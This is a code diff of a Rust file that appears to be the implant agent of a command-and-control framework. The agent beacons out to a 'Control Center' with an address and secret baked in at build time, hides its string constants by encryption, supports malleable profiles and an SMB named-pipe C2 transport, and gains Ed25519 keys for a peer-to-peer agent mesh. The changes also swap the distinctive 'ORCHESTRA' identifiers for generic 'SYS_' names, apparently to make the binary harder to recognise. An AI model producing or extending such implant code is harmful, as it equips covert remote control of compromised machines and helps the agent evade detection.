@@ -1,21 +1,21 @@
 //! Outbound connection mode — compiled only when `outbound-c` feature is active.
 //!
-//! The agent dials the Orchestra Control Center (instead of waiting for an
+//! The agent dials the Control Center (instead of waiting for an
 //! inbound connection from a console) and maintains a persistent session with
 //! exponential-backoff reconnection.
 //!
 //! # Address resolution
 //!
-//! Release builds use `ORCHESTRA_C_ADDR` baked into the binary at compile time
-//! via the Builder's `cargo build … ORCHESTRA_C_ADDR=<addr>` invocation and
-//! prioritize that value, but fall back to the `ORCHESTRA_C` runtime
+//! Release builds use `SYS_C_ADDR` baked into the binary at compile time
+//! via the Builder's `cargo build … SYS_C_ADDR=<addr>` invocation and
+//! prioritize that value, but fall back to the `SYS_C` runtime
 //! environment variable if the baked constant is absent. Debug builds instead
 //! prioritize the runtime environment variable to simplify local testing.
 //!
 //! # Secret resolution
 //!
-//! Release builds use `ORCHESTRA_C_SECRET` baked in at compile time and
-//! prioritize it, but fall back to the `ORCHESTRA_SECRET` runtime environment
+//! Release builds use `SYS_C_SECRET` baked in at compile time and
+//! prioritize it, but fall back to the `SYS_SECRET` runtime environment
 //! variable if the baked constant is absent. Debug builds instead prioritize
 //! the runtime environment variable for local testing.
 //!
@@ -32,8 +32,10 @@ use common::normalized_transport::{NormalizedTransport, Role, TrafficProfile};
 use common::tls_transport::{PinnedCertVerifier, TlsTransport};
 use common::CryptoSession;
 use common::forward_secrecy;
-use common::{Message, Transport};
+use common::{LockedSecret, Message, Transport};
+use ed25519_dalek::SigningKey;
 use log::{error, info, warn};
+use rand::rngs::OsRng;
 use rustls::ClientConfig;
 use std::sync::Arc;
 use sysinfo::System;
@@ -44,13 +46,13 @@ use tokio_rustls::TlsConnector;
 use uuid::Uuid;
 
 // Compile-time constants injected by the Builder (may be absent in manual builds).
-const BAKED_ADDR: Option<&str> = option_env!("ORCHESTRA_C_ADDR");
-const BAKED_SECRET: Option<&str> = option_env!("ORCHESTRA_C_SECRET");
-const BAKED_CERT_FP: Option<&str> = option_env!("ORCHESTRA_C_CERT_FP");
+const BAKED_ADDR: Option<&str> = option_env!("SYS_C_ADDR");
+const BAKED_SECRET: Option<&str> = option_env!("SYS_C_SECRET");
+const BAKED_CERT_FP: Option<&str> = option_env!("SYS_C_CERT_FP");
 /// Path to the PEM client certificate presented to the server during mTLS.
-const BAKED_MTLS_CERT: Option<&str> = option_env!("ORCHESTRA_C_MTLS_CERT");
+const BAKED_MTLS_CERT: Option<&str> = option_env!("SYS_C_MTLS_CERT");
 /// Path to the PEM private key for the mTLS client certificate.
-const BAKED_MTLS_KEY: Option<&str> = option_env!("ORCHESTRA_C_MTLS_KEY");
+const BAKED_MTLS_KEY: Option<&str> = option_env!("SYS_C_MTLS_KEY");
 
 const MAX_BACKOFF_SECS: u64 = 64;
 
@@ -61,7 +63,7 @@ const MAX_BACKOFF_SECS: u64 = 64;
 pub fn resolve_addr() -> Option<String> {
     // Always try the encrypted env var key first.
     let env_val = {
-        let raw = string_crypt::enc_str!("ORCHESTRA_C");
+        let raw = string_crypt::enc_str!("SYS_C");
         let key = std::str::from_utf8(&raw)
             .unwrap_or("")
             .trim_end_matches('\0');
@@ -82,7 +84,7 @@ pub fn resolve_addr() -> Option<String> {
 pub fn resolve_secret() -> Option<String> {
     // Always try the encrypted env var key first.
     let env_val = {
-        let raw = string_crypt::enc_str!("ORCHESTRA_SECRET");
+        let raw = string_crypt::enc_str!("SYS_SECRET");
         let key = std::str::from_utf8(&raw)
             .unwrap_or("")
             .trim_end_matches('\0');
@@ -237,10 +239,9 @@ pub async fn build_outbound_transport(
                          attempting SmbPipeTransport",
                         cfg.malleable_profile.smb_pipe_host.as_deref().unwrap_or("?")
                     );
-                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
                     match crate::c2_smb::SmbPipeTransport::new(
                         &cfg.malleable_profile,
-                        session,
+                        secret.as_bytes(),
                     )
                     .await
                     {
@@ -372,6 +373,8 @@ pub async fn build_outbound_transport(
 async fn run_with_heartbeat(
     mut transport: Box<dyn Transport + Send>,
     agent_id: &str,
+    mesh_public_key: [u8; 32],
+    mesh_private_key: Arc<LockedSecret>,
 ) -> Result<()> {
     // ── Protocol version handshake (M-2) ─────────────────────────────────────
     // Send our version first so the server can reject incompatible agents fast,
@@ -426,10 +429,11 @@ async fn run_with_heartbeat(
                 .unwrap_or(0),
             agent_id: agent_id.to_string(),
             status: hostname,
+            mesh_public_key: Some(mesh_public_key),
         })
         .await?;
     info!("outbound-c: registered with Control Center, running command loop");
-    let mut agent = crate::Agent::new(transport)?;
+    let mut agent = crate::Agent::new(transport, mesh_private_key, mesh_public_key)?;
     agent.run().await
 }
 
@@ -445,9 +449,11 @@ async fn connect_once(
     secret: &str,
     agent_id: &str,
     cert_fp: Option<&str>,
+    mesh_public_key: [u8; 32],
+    mesh_private_key: Arc<LockedSecret>,
 ) -> Result<()> {
     let transport = build_outbound_transport(addr, secret, cert_fp, agent_id).await?;
-    run_with_heartbeat(transport, agent_id).await
+    run_with_heartbeat(transport, agent_id, mesh_public_key, mesh_private_key).await
 }
 
 /// Reconnect loop with exponential back-off. Returns only on clean shutdown
@@ -460,16 +466,16 @@ pub async fn run_forever() -> Result<()> {
     let addr = resolve_addr().ok_or_else(|| {
         anyhow!(
             "No Control Center address configured. \
-             Rebuild with ORCHESTRA_C_ADDR set (the Builder does this automatically). \
-             Debug builds may also set ORCHESTRA_C at runtime."
+             Rebuild with SYS_C_ADDR set (the Builder does this automatically). \
+             Debug builds may also set SYS_C at runtime."
         )
     })?;
 
     let secret = resolve_secret().ok_or_else(|| {
         anyhow!(
             "No pre-shared secret configured. \
-             Rebuild with ORCHESTRA_C_SECRET set. \
-             Debug builds may also set ORCHESTRA_SECRET at runtime."
+             Rebuild with SYS_C_SECRET set. \
+             Debug builds may also set SYS_SECRET at runtime."
         )
     })?;
 
@@ -477,7 +483,7 @@ pub async fn run_forever() -> Result<()> {
     if cert_fp.is_none() {
         warn!(
             "outbound-c: no TLS certificate fingerprint configured. \
-             Production deployments should bake in ORCHESTRA_C_CERT_FP for strict pinning."
+             Production deployments should bake in SYS_C_CERT_FP for strict pinning."
         );
     }
 
@@ -488,6 +494,19 @@ pub async fn run_forever() -> Result<()> {
         System::host_name().unwrap_or_else(|| "agent".to_string()),
         Uuid::new_v4()
     );
+
+    // Generate a long-term Ed25519 keypair for P2P mesh authentication.
+    // The public key is sent to the server in the Heartbeat message and
+    // bound into the mesh certificate.  The private key is stored in a
+    // LockedSecret (mlocked, zeroized on drop) and used to prove identity
+    // during P2P link handshakes.
+    let mesh_signing_key = SigningKey::generate(&mut OsRng);
+    let mesh_public_key = mesh_signing_key.verifying_key().to_bytes();
+    let mesh_private_key = Arc::new(LockedSecret::new(
+        mesh_signing_key.to_bytes().as_ref(),
+    ));
+    info!("outbound-c: generated Ed25519 mesh keypair (pub={:02x}{:02x}...)",
+           mesh_public_key[0], mesh_public_key[1]);
 
     let mut backoff = Duration::from_secs(1);
     let mut session_backoff = Duration::from_secs(2);
@@ -526,7 +545,7 @@ pub async fn run_forever() -> Result<()> {
         // Transport established — run the session.  When the session ends
         // (clean shutdown or disconnect), reconnect with a fresh 1 s backoff.
         let session_start = Instant::now();
-        match run_with_heartbeat(transport, &agent_id).await {
+        match run_with_heartbeat(transport, &agent_id, mesh_public_key, mesh_private_key.clone()).await {
             Ok(()) => {
                 // Clean shutdown — respect it, do not reconnect.
                 info!("outbound-c: received Shutdown from Control Center, exiting.");
